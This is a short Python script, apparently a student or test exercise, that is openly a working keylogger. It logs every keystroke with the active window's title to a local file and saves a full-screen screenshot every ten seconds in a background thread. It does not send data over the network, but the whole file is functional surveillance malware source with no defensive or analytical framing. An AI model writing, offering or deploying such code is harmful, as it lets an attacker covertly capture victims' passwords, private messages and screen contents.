from pynput.keyboard import Listener
from datetime import datetime
import pygetwindow as gw
import logging
import os
import threading
import time
from PIL import ImageGrab

CARPETA_LOG = "C:\\Prueba_Final"
CARPETA_SCREENSHOTS = os.path.join(CARPETA_LOG, "screenshots")
ARCHIVO_LOG = os.path.join(CARPETA_LOG, "keylog.txt")

os.makedirs(CARPETA_SCREENSHOTS, exist_ok=True)

logging.basicConfig(
    filename=ARCHIVO_LOG,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

def get_active_window():
    try:
        win = gw.getActiveWindow()
        return win.title if win else "Desconocida"
    except:
        return "Desconocida"

def on_press(key):
    try:
        k = str(key).replace("'", "")
        if "Key." in k:
            k = k.replace("Key.", "[") + "]"
        window = get_active_window()
        logging.info(f"[{window}] {k}")
    except Exception:
        pass

def capturar_pantalla():
    while True:
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            ruta = os.path.join(CARPETA_SCREENSHOTS, f"captura_{timestamp}.png")
            img = ImageGrab.grab()
            img.save(ruta)
        except Exception:
            pass
        time.sleep(10)

print("Keylogger activo. Capturas cada 10s. Ctrl+C para detener.")

hilo_captura = threading.Thread(target=capturar_pantalla, daemon=True)
hilo_captura.start()

with Listener(on_press=on_press) as listener:
    listener.join()